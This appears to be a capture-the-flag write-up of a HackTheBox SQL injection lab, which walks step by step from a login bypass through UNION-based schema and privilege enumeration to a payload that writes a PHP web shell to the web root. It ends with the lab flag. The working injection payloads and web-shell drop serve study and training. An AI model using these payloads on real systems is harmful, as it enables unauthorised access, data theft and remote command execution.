# sqlinjection
sql injection is a method of how we bypass the system to find whether there is a vulnerability in a system or not, by utilising how the database works, in this ctf I used the hackthebox platform to find flags where in this lab I was asked to find the flag of a flag using sql injection.

## 1. **Login Into the page**
to enter the website I use the basic method where I try to manipulate the admin login accent by using the following command:
username:`admin' OR 1=1 -- -`
pasword: `testing`
and it output:
![loginadmin](https://drive.usercontent.google.com/download?id=14e2By7xIO0rRizcUENYfVnERnhykZaek&export=download&authuser=0&confirm=t&uuid=866a8f5a-3b4b-41e1-9eb2-dc00d2b3dc92&at=AIrpjvNVkhCJeL7VZtWccTdWOL6b:1739109049636)

## 2. Check for the table informations**
when checked the table using command `ORDER BY 5 -- -` then I can see how many tables are stored by the system, this way I can start inserting payloads on the system but if the table is more than i trying to access it will throws error:
![orderingtable](https://drive.usercontent.google.com/download?id=13l_sY8PAqw04_61-OaJkTIUAedY8JtXZ&export=download&authuser=0&confirm=t&uuid=f9e656fb-aff0-4445-b1e2-2233437668cc&at=AIrpjvMsGRMpDV6EHS-JDmb25mpj:1739108872263)
## 3. Checking the database schema 
to view the database schema where it can show information on how the database is handled and what databases exist by entering the following payload: `cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -`
with result:
![databaseschema](https://drive.usercontent.google.com/download?id=1HMOViusldhQh-RpPuC3s_rgpito8RIrt&export=download&authuser=0&confirm=t&uuid=448aeed4-4305-4bbb-a90a-6030e679b98e&at=AIrpjvP25CwG12ojwDVdnViFKElI:1739109547050)
after that i check database users that currently use the database `cn' UNION SELECT 1, user(), 3,4,5 -- -`
result:
![result](https://drive.usercontent.google.com/download?id=165qaDYEjOxZfuFzD82J8895NJvJCwDvx&export=download&authuser=0&confirm=t&uuid=ceb11ec7-0c4a-48a3-a9d6-1408fcd22950&at=AIrpjvOwEN1oBPD7C4edW41Cp2Ep:1739109619157)
## 4. Check the admin priviledge
to be able to execute the webshell I'm trying to see if users have admin priviledges and some common functionality using this payload: `cn' UNION SELECT 1, super_priv, 3,4,5 FROM mysql.user WHERE user="root"-- -` and also this payload `cn' UNION SELECT 1, grantee, privilege_type,is_grantable,5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
result:
![result](https://drive.usercontent.google.com/download?id=1Z8436nXhK8EH39meOLffbwuMhRb55Vpm&export=download&authuser=0&confirm=t&uuid=0f57873d-39c9-43a5-935a-2e66ddd34747&at=AIrpjvPCMXMD2xepEgxK2rdqi4ry:1739109771911)
## 5. Excecute  a webshell
After I tried to enter this, I finally tried to enter this payload `cn' union select "",'<?php system($_REQUEST[0]); ?>', "","","" into outfile '/var/www/html/dashboard/shell.php'-- -`  to execute the webshell with the results after listing the root  directories:
![result](https://drive.usercontent.google.com/download?id=1oGKTYr9HRSKZF7KsFBQFfR2QnJsfCqHO&export=download&authuser=0&confirm=t&uuid=1e609fdd-b8e3-40e8-b41f-4dfc5b3b261b&at=AIrpjvNnvEtS3RKnOYp78AZPftq4:1739109951999)
and then i catting the flag file
![flag](https://drive.usercontent.google.com/download?id=1WxuFjsuQ3ghaZfiq-zXunbqCVjepU61_&export=download&authuser=0&confirm=t&uuid=f7ef62a3-f901-428e-9ef0-7082a36557fe&at=AIrpjvO2dVFO_xbrVSYlkQQSv3vH:1739110091196)
and the flag is:
`528d6d9cedc2c7aab146ef226e918396`
